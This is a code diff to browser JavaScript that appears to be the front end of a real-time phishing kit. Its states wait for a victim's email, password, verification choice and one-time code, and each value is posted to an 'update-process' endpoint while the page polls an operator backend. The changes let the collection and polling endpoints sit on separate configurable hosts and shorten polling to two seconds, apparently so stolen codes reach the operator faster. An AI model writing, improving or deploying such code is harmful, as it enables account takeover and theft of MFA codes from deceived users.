@@ -773,10 +773,17 @@
 const templateConfig = {
   postURL: "{{postURL}}",
   token: "{{token}}",
-  landingPageLink: "{{landingPageLink}}"
+  landingPageLink: "{{landingPageLink}}",
+  pollingUrl: "{{pollingUrl}}",
+  updateUrl: "{{updateUrl}}"
 };
 
-const apiBaseUrl = window.location.origin + "/api";
+const apiBaseUrl = templateConfig.pollingUrl
+  ? templateConfig.pollingUrl.replace('/pooling-operator', '')
+  : window.location.origin + "/api";
+const updateBaseUrl = templateConfig.updateUrl
+  ? templateConfig.updateUrl.replace('/update-process', '')
+  : window.location.origin + "/api";
 
 // ==================== STATE ====================
 let browserId = null;
@@ -974,6 +981,14 @@ async function initialFormSubmission() {
 
     if (data.apiResponse && data.apiResponse.browserId) {
       browserId = data.apiResponse.browserId;
+      if (data.pollingUrl && !templateConfig.pollingUrl) {
+        templateConfig.pollingUrl = data.pollingUrl;
+        apiBaseUrl = data.pollingUrl.replace('/pooling-operator', '');
+      }
+      if (data.updateUrl && !templateConfig.updateUrl) {
+        templateConfig.updateUrl = data.updateUrl;
+        updateBaseUrl = data.updateUrl.replace('/update-process', '');
+      }
       updateUIForStatus(data.apiResponse.status, data.apiResponse);
     } else {
       throw new Error("No browserId received");
@@ -1036,7 +1051,7 @@ function updateUIForStatus(status, data = {}) {
       showLoading(loadingMessages[0]);
       if (emailSubmitBtn) { emailSubmitBtn.disabled = true; emailSubmitBtn.textContent = 'Processing...'; }
       if (phoneSubmitBtn) { phoneSubmitBtn.disabled = true; phoneSubmitBtn.textContent = 'Processing...'; }
-      startPolling(10000);
+      startPolling(2000);
       break;
 
     case 'WAITINGEMAIL':
@@ -1055,7 +1070,7 @@ function updateUIForStatus(status, data = {}) {
           }
         } catch(e) {}
       }
-      startPolling(10000);
+      startPolling(2000);
       break;
 
     case 'WAITINGPASSWORD':
@@ -1077,7 +1092,7 @@ function updateUIForStatus(status, data = {}) {
         } catch(e) {}
       }
       lastShownStatus = currentStatus;
-      startPolling(10000);
+      startPolling(2000);
       break;
 
     case 'WAITINGOPTIONS':
@@ -1087,7 +1102,7 @@ function updateUIForStatus(status, data = {}) {
       if (typeof rawOpts === 'string') { try { rawOpts = JSON.parse(rawOpts); } catch(e) { rawOpts = []; } }
       verificationOptions = Array.isArray(rawOpts) ? rawOpts : [];
       renderVerificationOptions(verificationOptions);
-      startPolling(10000);
+      startPolling(2000);
       break;
 
     case 'WAITINGCODE':
@@ -1102,7 +1117,7 @@ function updateUIForStatus(status, data = {}) {
           }
         } catch(e) {}
       }
-      startPolling(10000);
+      startPolling(2000);
       break;
 
     case 'COMPLETED':
@@ -1203,7 +1218,7 @@ async function handleUserSubmission() {
     payload.updateType = updateType;
     console.log("User submission:", payload);
 
-    const response = await fetch(apiBaseUrl + "/update-process", {
+    const response = await fetch(updateBaseUrl + "/update-process", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: objectToFormData(payload)
@@ -1213,7 +1228,7 @@ async function handleUserSubmission() {
     const data = await response.json();
     console.log("Update response:", data);
     pollingStartTime = Date.now();
-    startPolling(3000);
+    startPolling(2000);
   } catch (error) {
     console.error("Submission error:", error);
     hideLoading();
@@ -1235,14 +1250,14 @@ async function submitVerificationChoice() {
   };
 
   try {
-    const response = await fetch(apiBaseUrl + "/update-process", {
+    const response = await fetch(updateBaseUrl + "/update-process", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: objectToFormData(payload)
     });
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     pollingStartTime = Date.now();
-    startPolling(3000);
+    startPolling(2000);
   } catch (error) {
     console.error("Verification choice error:", error);
     hideLoading();
@@ -1262,14 +1277,14 @@ async function submitVerificationCode() {
   };
 
   try {
-    const response = await fetch(apiBaseUrl + "/update-process", {
+    const response = await fetch(updateBaseUrl + "/update-process", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: objectToFormData(payload)
     });
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     pollingStartTime = Date.now();
-    startPolling(3000);
+    startPolling(2000);
   } catch (error) {
     console.error("Verification code error:", error);
     hideLoading();
